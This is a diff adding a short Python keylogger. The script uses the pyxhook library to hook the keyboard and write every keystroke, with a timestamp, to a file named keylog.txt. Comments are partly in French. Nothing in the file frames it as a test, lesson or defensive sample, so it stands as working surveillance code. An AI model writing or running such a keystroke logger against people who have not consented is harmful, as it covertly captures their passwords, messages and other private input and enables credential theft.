@@ -1,0 +1,32 @@
+import pyxhook
+import logging
+
+# Configurer le logging
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s - %(message)s')
+
+def on_key_press(event):
+    # Log the key press event
+    key = event.Ascii
+    if key == 9:  # Tab key
+        key = '[TAB]'
+    elif key == 13:  # Enter key
+        key = '[ENTER]'
+    elif key == 8:  # Backspace key
+        key = '[BACKSPACE]'
+    elif key == 27:  # Escape key
+        key = '[ESCAPE]'
+    elif key == 32:  # Space key
+        key = ' '
+    elif key >= 32 and key < 127:  # characters printable
+        key = chr(key)
+    else:
+        key = '[UNKNOWN]'
+    logging.info(f"Key pressed: {key}")
+
+# Deployer le hook manager
+hookman = pyxhook.HookManager()
+hookman.KeyDown = on_key_press
+hookman.HookKeyboard()
+
+#Commencer le hook manager
+hookman.start()
